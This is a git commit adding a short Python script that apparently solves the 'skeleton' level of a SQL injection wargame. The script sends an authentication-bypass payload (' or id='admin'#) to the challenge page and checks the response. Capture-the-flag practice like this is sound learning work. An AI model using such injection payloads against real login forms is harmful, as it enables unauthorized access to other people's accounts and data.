7c4bf7c3befe613fa20b2f534436900fb9bd1f9f
yoobi <thisisyoobi@gmail.com>
2024-01-11 22:49:35 +0900

    skeleton clear

---
+++ LOS/10_skeleton/ex.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python3
+
+'''
+# Summary
+- we can use ||, && instead of OR, AND
+'''
+
+
+import requests
+
+header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
+url = "https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php"
+
+payload = "?pw=' or id='admin'%23"
+
+response = requests.get(url + payload, headers=header)
+
+result = response.text
+if result.find("Clear!") != -1:
+    end = result.split("Clear!")[0].split("<h2>")[1]
+    if end.find("admin") != -1:
+        end = result.split("Clear!")[0].split("<h2>")[2]
+    print(end+"Clear!")
